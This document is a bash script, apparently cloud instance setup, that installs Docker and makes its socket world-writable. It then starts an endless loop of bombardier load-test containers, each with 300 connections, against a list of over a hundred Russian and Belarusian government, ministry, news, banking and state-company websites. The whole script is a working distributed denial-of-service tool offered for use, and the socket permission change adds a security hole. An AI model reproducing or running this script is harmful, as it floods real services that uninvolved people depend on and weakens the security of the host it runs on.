#!/bin/bash

yum update -y
yum install docker -y
service docker start
chmod 666 /var/run/docker.sock

cd /

cat <<'EOF' >runall.sh
#!/bin/sh

while :
do
   while IFS= read -r line; do
      docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 10m -l "$line"
   done < resources.txt
   sleep 10m
done
EOF

chmod u+x runall.sh

cat <<EOF >>resources.txt
http://ridus.ru
http://tvc.ru
https://cont.ws
https://tsargrad.tv
https://rg.ru
https://riafan.ru
https://www.rt.com
https://rossaprimavera.ru
https://mil.ru
https://www.gosuslugi.ru
https://mid.ru
https://www.1tv.ru
https://pnp.ru
https://tass.ru
https://vesti.ru
https://yandex.ru
https://iz.ru
https://lenta.ru
https://vgtrk.ru
https://ria.ru
https://rambler.ru
https://gazeta.ru
https://belta.by
https://mk.ru
https://gazprom.ru
https://gazprombank.ru
https://znak.com
https://cbr.ru
https://sberbank.ru
https://vtb.ru
https://rosbank.ru
https://kp.ru
https://karaulovlife.ru
https://news-front.info/
https://rusnext.ru/
http://life.ru/
https://www.mid-dnr.su/
https://www.5-tv.ru/live/
http://zvezda.ru/
https://www.politnavigator.net/
https://russian.rt.com/
http://lt.sputniknews.ru/
http://sputniknews.lt/
https://sputnik-abkhazia.ru/
http://francais.rt.com/
https://novorosinform.org/
https://ren.tv/
http://tvzvezda.ru/
http://www.kremlin.ru/
http://www.scrf.gov.ru/
http://sovetnational.ru/
http://president-sovet.ru/
http://www.council.gov.ru/
http://www.duma.gov.ru/
http://www.ksrf.ru/
http://www.vsrf.ru/
http://government.ru/
http://mvd.ru/
https://www.mchs.gov.ru/
https://minjust.gov.ru/
https://minzdrav.gov.ru/
http://mkrf.ru/
http://edu.gov.ru/
http://minobrnauki.gov.ru/
http://www.mnr.gov.ru/
http://minpromtorg.gov.ru/
http://minvr.ru/
http://www.mcx.ru/
http://www.minsport.gov.ru/
http://www.minstroyrf.ru/
http://www.mintrans.ru/
http://www.rosmintrud.ru/
http://minfin.ru/
http://economy.gov.ru/
http://minenergo.gov.ru/
http://www.fsvts.gov.ru/
http://www.fstec.ru/
http://www.fsin.su
http://www.fssprus.ru/
http://gfs.gov.ru/
http://svr.gov.ru/
http://www.fsb.ru/
http://rosgvard.ru/
http://www.fso.gov.ru/
http://www.fedsfm.ru/
http://www.meteorf.ru/
http://rpn.gov.ru/
http://www.fsvps.ru/
http://www.rostransnadzor.ru/
http://www.rostrud.ru/
http://www.nalog.ru/
http://www.probpalata.ru
http://fsrar.ru/
http://www.customs.gov.ru/
http://www.roskazna.ru/
http://rkn.gov.ru/
http://www.fsa.gov.ru/
http://rosstat.gov.ru/
http://www.rupto.ru/
http://fas.gov.ru/
http://www.rosreestr.ru/
http://rospotrebnadzor.ru/
http://www.roszdravnadzor.ru
http://obrnadzor.gov.ru/
http://www.gosnadzor.ru/
http://www.rosatom.ru/
http://www.roscosmos.ru/
http://www.asv.org.ru/
https://veb.ru/
http://www.rusnano.com/
http://www.fondgkh.ru/
http://sc-os.ru/
http://rostec.ru/
EOF

./runall.sh